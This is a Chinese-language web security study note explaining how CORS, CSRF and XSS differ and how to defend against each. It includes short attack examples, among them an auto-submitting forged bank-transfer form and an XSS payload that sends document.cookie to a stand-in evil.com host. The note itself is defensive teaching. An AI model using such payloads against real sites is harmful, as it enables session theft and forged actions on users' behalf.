---
title: "CORS、CSRF、XSS：区别、联系与防御"
created: 2026-03-24
updated: 2026-03-24
tags:
  - "security"
  - "http"
  - "browser"
  - "frontend"
type: capture
status: inbox
source_type: migrated_note
source_path: "面试/基础/基础-CORS、CSRF、XSS：区别、联系与防御.md"
---

# CORS、CSRF、XSS：区别、联系与防御

## 一句话先说清

这三个概念经常被混在一起，是因为它们都发生在浏览器里，但它们解决的根本不是同一个问题：

- **CORS**：控制“这个网页里的 JS 能不能读另一个源的响应”
- **CSRF**：防止“攻击者借你的登录态去替你发起操作”
- **XSS**：防止“攻击者把脚本塞进你的页面里直接控制你的浏览器环境”

最容易搞错的一点：

- **CORS 不是后端防火墙**
- **CORS 防不住 CSRF**
- **XSS 一旦成立，很多前端防线都会被绕开**

---

## 先看根因：为什么会有这些问题

浏览器天生同时要满足两件互相冲突的事：

1. 网页要能发请求、执行脚本、保持登录状态
2. 不同网站之间又不能互相乱拿数据、乱冒用身份

于是浏览器做了几套限制：

- **同源策略**：默认不允许一个源的 JS 随便读取另一个源的数据
- **Cookie 自动携带**：请求命中对应域名时，浏览器会自动带上该域名的 Cookie
- **页面脚本默认可信**：只要脚本成功运行在当前页面上下文里，它就拥有当前页面的大部分能力

问题也正是从这里长出来的：

- 因为要限制“读数据”，所以有了 **CORS**
- 因为 Cookie 会自动带上，所以有了 **CSRF**
- 因为页面会执行脚本，所以有了 **XSS**

---

## 1. CORS：防跨源读数据，不是防请求到达服务端

### 本质

**CORS 是浏览器基于同源策略提供的一套放行机制。**

默认情况下，恶意网站上的 JS 可以把请求发出去，但**不能随便读响应内容**。

### 典型场景

你登录了 `bank.com`，然后打开了恶意网站 `evil.com`。

`evil.com` 里的 JS 执行：

```javascript
fetch('https://bank.com/api/user/profile', {
  credentials: 'include'
})
```

会发生什么：

1. 请求很可能真的发到了 `bank.com`
2. 浏览器也可能真的带上了符合条件的 Cookie
3. 但如果 `bank.com` 没有正确返回 CORS 头，**`evil.com` 的 JS 读不到响应**

所以 CORS 防的是：

- **跨源页面读取你的响应数据**

它不防的是：

- 请求发到服务端
- 服务端真的执行了某个副作用操作
- `curl`、Postman、服务端脚本来调用接口

### 关键响应头

```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
```

关键点：

- `Access-Control-Allow-Origin` 指定哪些源可以读响应
- 如果要带 Cookie，不能配 `*`
- 前端还要显式带 `credentials: 'include'`

### 一个常见误区

“配了 CORS，就不会被不该访问的服务访问。”

这是错的。CORS 只约束**浏览器是否把响应暴露给 JS**，不是约束“谁能访问你的服务”。真正的访问控制还是鉴权、权限校验、网关策略。

---

## 2. CSRF：防别人借你的登录态替你干活

### 本质

**CSRF 利用的是浏览器会自动携带 Cookie 这个机制。**

攻击者不需要读响应，只需要请求真的发出去，并且服务端把它当成用户本人操作即可。

### 典型场景

用户已经登录 `bank.com`，Cookie 还有效。

这时用户访问 `evil.com`，页面里放一个表单：

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit()
</script>
```

如果 `bank.com` 只靠 Cookie 判断身份，没有额外校验：

1. 浏览器会把 `bank.com` 的 Cookie 自动带上
2. 服务端会把这次请求当成用户本人发起
3. 转账就可能真的执行

### 为什么 CORS 防不住 CSRF

因为 CSRF 的目标不是“读响应”，而是“让请求成功执行”。

攻击方式可以是：

- `<form>`
- `<img>`
- `<script>`
- `<a>`

这些都不是“我要跨域读 AJAX 响应”的问题，因此**CORS 不是这个层面的防线**。

### 防御手段

#### 1. SameSite Cookie

最直接的浏览器级防线是 `SameSite`：

- `Strict`：跨站请求一律不带
- `Lax`：多数跨站子请求不带，顶级导航的部分 GET 允许
- `None`：允许跨站带 Cookie，但必须配合 `Secure`

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```

这会直接减少“别的站点替你带上 Cookie”的机会。

#### 2. CSRF Token

服务端给页面下发一个攻击者拿不到、且每次请求都要带上的随机 token。

服务端验证：

- Cookie 证明“你是谁”
- CSRF Token 证明“这个请求确实来自我自己页面”

#### 3. Origin / Referer 校验

对敏感写操作额外检查：

- `Origin`
- `Referer`

这不是最强防线，但适合作为补充。

#### 4. 不要把所有认证都绑定在自动携带凭证上

只要身份验证完全依赖“浏览器自动带 Cookie”，CSRF 风险就天然存在。

---

## 3. XSS：防攻击者把脚本放进你的页面里执行

### 本质

**XSS 不是跨站发请求，而是跨站注入脚本。**

一旦恶意脚本运行在 `your-app.com` 的页面上下文里，浏览器会把它当成“这个站自己的脚本”。

这意味着它可以：

- 读取页面内容
- 读取 `localStorage` / `sessionStorage`
- 发起同源请求
- 操作 DOM
- 冒充用户完成前端操作

如果 Cookie 没有 `HttpOnly`，它甚至还能读 `document.cookie`。

### 典型场景

后端把用户评论原样渲染到页面：

```html
<div><script>fetch('https://evil.com?c=' + document.cookie)</script></div>
```

只要这段脚本成功注入并执行：

1. 页面环境就被劫持
2. 本地存储、页面数据、非 `HttpOnly` Cookie 都可能泄漏
3. 攻击者还能继续用这段脚本调用站内接口做更多事

### 常见类型

- **反射型 XSS**：恶意内容通过请求参数立刻反射到页面
- **存储型 XSS**：恶意内容被存进数据库，后续所有访问者都会中招
- **DOM 型 XSS**：前端 JS 自己把不可信数据塞进危险 DOM API

### 防御手段

#### 1. 输出时转义，而不是只在输入时幻想自己全拦住

核心原则：

- 不可信内容进入 HTML 时做 HTML 转义
- 进入属性、URL、JS 字符串时用对应上下文的编码规则
- 不要直接拼接 `innerHTML`

#### 2. 使用安全的 DOM API

优先用：

- `textContent`
- `innerText`
- 安全模板渲染

慎用：

- `innerHTML`
- `outerHTML`
- `dangerouslySetInnerHTML`
- `eval`

#### 3. 设置 CSP

`Content-Security-Policy` 可以限制：

- 哪些脚本源允许执行
- 是否允许内联脚本
- 是否允许 `eval`

它不能代替转义，但能显著降低 XSS 伤害面。

#### 4. 关键 Cookie 设置 HttpOnly + Secure

```http
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax
```

要说准确：

- `HttpOnly`：禁止 JS 读取 Cookie
- `Secure`：只允许在 **HTTPS** 请求中传输，不是“只有 HTTP 能拿”

所以 `Secure` 解决的是传输安全，`HttpOnly` 解决的是脚本读取问题。

---

## 三者关系：它们不是并列知识点，而是一个攻击链

### 关系一：CORS 和 CSRF 关注的不是同一件事

- `CORS` 关注：**能不能读响应**
- `CSRF` 关注：**能不能借身份发操作**

因此：

- 一个接口就算 CORS 配得很严
- 只要它接受 Cookie 身份、又没有 CSRF 防护
- 仍然可能被跨站伪造请求打中

### 关系二：XSS 比 CSRF 更凶

如果你的页面已经被 XSS 打穿，那么攻击脚本就运行在你自己的源下。

这时候它通常可以：

- 直接发同源请求
- 读取页面里的 CSRF Token
- 操纵页面发起真实用户操作

所以很多时候：

- **XSS 一旦成立，CSRF Token 这类防线的价值会被大幅削弱**

这也是为什么前端安全里总说：

- **优先堵 XSS**

### 关系三：Cookie 安全属性横跨两类问题

- `SameSite` 主要缓解 **CSRF**
- `HttpOnly` 主要缓解 **XSS 窃取 Cookie**
- `Secure` 保证 Cookie 不走明文 HTTP

它们不是一回事，但经常一起配置。

---

## 放到一张表里看

| 项目 | CORS | CSRF | XSS |
|------|------|------|-----|
| 本质 | 浏览器跨源读响应控制 | 借用户身份伪造请求 | 注入并执行恶意脚本 |
| 利用前提 | 跨源 JS 想读响应 | 浏览器会自动带认证信息 | 页面存在脚本注入点 |
| 攻击目标 | 偷接口返回数据 | 替用户执行操作 | 控制页面、窃取凭证、横向扩散 |
| 是否需要读响应 | 需要 | 通常不需要 | 不一定 |
| 核心防线 | 正确配置 CORS | SameSite、CSRF Token、Origin 校验 | 转义、CSP、安全 DOM API、HttpOnly |
| 典型误区 | 以为 CORS 能拦所有跨域访问 | 以为 CORS 能防 CSRF | 以为只过滤输入就够了 |

---

## 一个最实用的记忆方式

别死记定义，记“浏览器到底帮了谁”：

- **CORS**：浏览器帮服务器拦“别的源读取响应”
- **CSRF**：浏览器因为太勤快，自动帮用户带上 Cookie，结果被坏人利用
- **XSS**：浏览器太信任页面里的脚本，结果把攻击者也当成自己人

---

## 实战防御清单

### 后端

- 默认要求敏感写接口做鉴权，不要把 CORS 当鉴权
- 会话 Cookie 默认配 `HttpOnly; Secure; SameSite=Lax`
- 对真正需要跨站带 Cookie 的场景，才使用 `SameSite=None; Secure`
- 对写操作接口加 `CSRF Token`
- 补 `Origin / Referer` 校验

### 前端

- 不信任任何用户输入、富文本、URL 参数
- 不直接拼接 `innerHTML`
- 统一使用模板转义或安全渲染组件
- 配置 `CSP`
- 不把高价值凭证裸放进 `localStorage`

### 认知上

- CORS 解决不了认证和授权
- CSRF 的根在“自动带凭证”
- XSS 的根在“执行了不该执行的脚本”

---

## 面试时可以这样回答

> `CORS`、`CSRF`、`XSS` 都是浏览器安全相关，但不是一类问题。`CORS` 解决的是跨源页面能不能读响应，本质是同源策略的放行机制；`CSRF` 利用的是浏览器自动带 Cookie，攻击者不需要读响应，只要请求成功执行就够了，所以 CORS 防不住 CSRF；`XSS` 是恶意脚本注入，一旦脚本运行在站点上下文里，就可以读页面数据、读本地存储、发同源请求，所以危害通常更大。防御上，CORS 靠正确响应头，CSRF 靠 SameSite 和 CSRF Token，XSS 靠输出转义、CSP、HttpOnly 和安全 DOM API。`

---

## 关联笔记

- [[基础-CORS 跨域资源共享]]
- [[基础-Cookie 知识点详解]]
- [[待学习：Web安全与权限控制]]
